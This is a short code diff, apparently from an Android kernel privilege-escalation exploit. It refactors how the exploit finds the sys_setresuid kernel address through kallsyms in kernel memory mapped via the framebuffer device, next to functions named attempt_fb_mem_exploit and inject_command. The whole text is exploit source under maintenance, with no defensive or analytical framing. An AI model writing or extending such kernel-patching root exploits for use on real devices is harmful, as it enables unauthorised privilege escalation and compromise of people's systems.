@@ -100,6 +100,15 @@ get_sys_setresuid_addresses(void)
   return get_sys_setresuid_address_from_kallayms();
 }
 
+static unsigned long int
+get_sys_setresuid_address_in_memory(void *kernel_memory)
+{
+  if (!kallsyms_in_memory_init(kernel_memory, 0x1000000)) {
+    return 0;
+  }
+  return kallsyms_in_memory_lookup_name("sys_setresuid");
+}
+
 static bool
 inject_command(const char *command,
                unsigned long int sys_setresuid_address)
@@ -176,8 +185,8 @@ attempt_fb_mem_exploit(void)
     return false;
   }
 
-  if (!kallsyms_in_memory_init(mapped_address, 0x1000000) ||
-      (sys_setresuid_address = kallsyms_in_memory_lookup_name("sys_setresuid")) == 0) {
+  sys_setresuid_address = get_sys_setresuid_address_in_memory(mapped_address);
+  if (!sys_setresuid_address) {
     printf("Failed to get sys_setresuid address due to %s\n", strerror(errno));
 
     fb_mem_munmap(mapped_address, fd);
